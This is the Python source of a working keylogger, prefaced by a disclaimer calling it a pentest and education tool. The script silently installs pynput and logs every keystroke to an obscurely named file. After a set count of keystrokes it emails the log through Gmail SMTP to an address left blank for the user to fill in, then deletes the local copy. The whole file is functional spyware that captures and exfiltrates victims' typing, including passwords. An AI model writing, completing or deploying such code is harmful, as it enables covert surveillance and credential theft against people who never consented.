# WARNING: This program is NOT intended to be used maliciously. This program is intended for use as a legal
# pentration testing tool or for education. This creator holds no responsibility for the actions or outcomes 
# resulting from criminal or malicious use. There is enough bad going on in the world, please don't add to it
# by abusing this program. 

import subprocess

# Install Modules
def install_module(module):
    subprocess.check_call(["pip3", "install", module], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

install_module('pynput')

# Import Modules
from pynput.keyboard import Key, Listener
import smtplib
from email.message import EmailMessage
import socket
import os
import datetime

class Emailer():

    def __init__(self, num_clicks_to_send=500):
        self.num_clicks_to_send = num_clicks_to_send
        self.key_click_timer = num_clicks_to_send

    def email_log(self, log_path):
        if self.key_click_timer == 0:
            with open(log_path, 'r') as file:
                msg = EmailMessage()
                msg.set_content(file.read())
                timestamp = '{:%Y-%m-%d %H:%M:%S}'.format(datetime.datetime.now())
                msg['Subject'] = str(socket.gethostname()) + ": " + timestamp
                msg['From'] = str(socket.gethostname())
                msg['To'] = '' #FIXME -> Add gmail here
                server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
                server.ehlo()
                server.login() #FIXME -> Add login and password for gmail account here
                server.send_message(msg)
                server.close()
                self.key_click_timer = self.num_clicks_to_send
                os.remove(log_path)
        else:
            self.key_click_timer -= 1

class KeyLogger():

    SUPPORT_KEY = 'support key'
    ALPHANUMERIC_KEY = 'alphanumeric key'

    def __init__(self, send_log_via_email=False):
        self.log_path = 'etusetfdsaesadqwes.txt' 
        self.send_log_via_email = send_log_via_email
        self.emailer = Emailer(100)
        self.last_key_type = KeyLogger.SUPPORT_KEY
        with Listener(on_press=self.on_press) as listener:
            listener.join()

    def on_press(self, key):
        with open(self.log_path, 'a') as file:
            key = self.format_key(str(key))
            file.write(key)
        if self.send_log_via_email:
            self.emailer.email_log(self.log_path)

    def format_key(self, key: str):
        key = key.strip("'")
        if key == "Key.space": 
            key = " "
            self.last_key_type = KeyLogger.ALPHANUMERIC_KEY
        elif self.support_key_pressed(key) and self.last_key_type == KeyLogger.ALPHANUMERIC_KEY:
            key = '\n' + self.strip_prefix(key) + '\n'
            self.last_key_type = KeyLogger.SUPPORT_KEY
        elif self.support_key_pressed(key) and self.last_key_type == KeyLogger.SUPPORT_KEY:
            key = self.strip_prefix(key) + '\n'
            self.last_key_type = KeyLogger.SUPPORT_KEY
        else:
            self.last_key_type = KeyLogger.ALPHANUMERIC_KEY
        return key

    def strip_prefix(self, key):      
        return '[' + (key[4:len(key)]).upper() + ']'

    def support_key_pressed(self, key):
        return key[0:4] == 'Key.'


KeyLogger(send_log_via_email=True)
